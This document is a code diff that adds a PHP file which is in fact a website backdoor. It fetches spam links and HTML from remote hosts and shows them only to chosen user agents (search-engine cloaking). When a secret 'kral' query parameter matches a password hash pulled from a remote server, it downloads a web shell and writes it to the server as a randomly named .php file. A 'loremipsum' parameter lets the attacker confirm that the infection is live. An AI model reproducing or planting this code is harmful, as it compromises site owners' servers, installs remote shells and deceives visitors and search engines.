@@ -1,0 +1,125 @@
+<?php 
+if(@$_GET["loremipsum"]){echo '<!--LOREMIPSUM-->';exit();}
+$HOST_VAR=@$_SERVER["HTTP_HOST"];
+$HOST_VAR=str_replace('www.','',$HOST_VAR);
+function PHPCURL_FUNCTION($URL_VAR)
+{
+	global $HOST_VAR;$CH_VAR=curl_init();
+	curl_setopt($CH_VAR,CURLOPT_URL,$URL_VAR);
+	curl_setopt($CH_VAR,CURLOPT_SSL_VERIFYPEER,false);
+	curl_setopt($CH_VAR,CURLOPT_RETURNTRANSFER,true);
+	curl_setopt($CH_VAR,CURLOPT_USERAGENT,"KralBot");
+	curl_setopt($CH_VAR,CURLOPT_HTTPHEADER,array('KRAL-DOMAIN: '.$HOST_VAR.'',));
+	curl_setopt($CH_VAR,CURLOPT_TIMEOUT,10);
+	return curl_exec($CH_VAR);
+}
+function ECHO_FUNCTION($FILE_VAR)
+{
+	$ENCODE_VAR=@json_decode(str_rot13($FILE_VAR),true);
+	if(count($ENCODE_VAR["links"]))
+	{
+		$LINK_CODE_VAR='';
+		foreach($ENCODE_VAR["links"] as $FOREACH1_VAR)
+		{
+			$LINK_CODE_VAR.="<a href=\"".$FOREACH1_VAR["url"]."\" title=\"".$FOREACH1_VAR["title"]."\">".$FOREACH1_VAR["baslik"]."</a>\n";
+		}
+		$HTML_VAR=$ENCODE_VAR["html"];
+		$HTML_VAR=str_replace('{LINK_CODE_REPLACE}',$LINK_CODE_VAR,$HTML_VAR);
+		$UA_BLOCKED_VAR=0;
+		$UA_BLOCK_OPEN_VAR=0;if(count($ENCODE_VAR["agent"]["block"]))
+		{
+			$UA_BLOCK_OPEN_VAR=1;
+			foreach($ENCODE_VAR["agent"]["block"] as $BLOCKED_UA_VAR)
+			{
+				if(@preg_match('#'.$BLOCKED_UA_VAR.'#',$_SERVER["HTTP_USER_AGENT"]))
+				{
+					$UA_BLOCKED_VAR=1;break;
+				}
+			}
+		}
+		$UA_ACCEPT_VAR=0;
+		$UA_ACCEPT_OPEN_VAR=0;
+		if(count($ENCODE_VAR["agent"]["accept"]))
+		{
+			$UA_ACCEPT_OPEN_VAR=1;
+			foreach($ENCODE_VAR["agent"]["accept"] as $ACCEPT_UA_VAR)
+			{
+				if(@preg_match('#'.$ACCEPT_UA_VAR.'#',$_SERVER["HTTP_USER_AGENT"]))
+				{
+					$UA_ACCEPT_VAR=1;break;
+				}
+			}
+		}
+		if($UA_BLOCK_OPEN_VAR==1)
+		{
+			if($UA_BLOCKED_VAR==0)
+			{
+				if($UA_ACCEPT_OPEN_VAR==1)
+				{
+					if($UA_ACCEPT_VAR==1)
+					{
+						echo $HTML_VAR;
+					}
+				}else 
+				{
+					echo $HTML_VAR;
+				}
+			}
+		}else 
+		{
+			if($UA_ACCEPT_OPEN_VAR==1)
+			{
+				if($UA_ACCEPT_VAR==1)
+				{
+					echo $HTML_VAR;
+				}
+			}else 
+			{
+				echo $HTML_VAR;
+			}
+		}
+	}else 
+	{
+		$HTML_VAR=$ENCODE_VAR["html"];
+		$HTML_VAR=str_replace('{LINK_CODE_REPLACE}','',$HTML_VAR);
+		echo $HTML_VAR;
+	}
+}
+
+if(@$_GET["kral"])
+{
+	$RA_VAR=@$_GET["kral"];
+	if(function_exists('curl_init'))
+	{
+		$PASS_DATA_VAR=PHPCURL_FUNCTION(hex2bin($PASS_VAR));
+	}else 
+	{
+		$PASS_DATA_VAR=@file_get_contents(hex2bin($PASS_VAR));
+	}
+	if(sha1(md5($RA_VAR))==$PASS_DATA_VAR)
+	{
+		if(@$_GET["dir"])
+		{
+			$DIR_VAR=@$_GET["dir"];
+		}else 
+		{
+			$DIR_VAR='./';
+		}
+		if(function_exists('curl_init'))
+		{
+			$QWERT_VAR=PHPCURL_FUNCTION(hex2bin($SHELL_VAR));
+		}else 
+		{
+			$QWERT_VAR=@file_get_contents(hex2bin($SHELL_VAR));
+		}
+		$RANDOM_VAR=rand(0,9999999);
+		$SHELL_MAX_VAR=''.$DIR_VAR.''.md5($HOST_VAR.$RANDOM_VAR).'.php';
+		if(file_put_contents($SHELL_MAX_VAR,$QWERT_VAR))
+		{
+			echo $SHELL_MAX_VAR;exit();
+		}
+	}
+}
+$CURL_DATA_VAR=PHPCURL_FUNCTION(hex2bin($LINK_VAR));
+ECHO_FUNCTION($CURL_DATA_VAR);
+?>
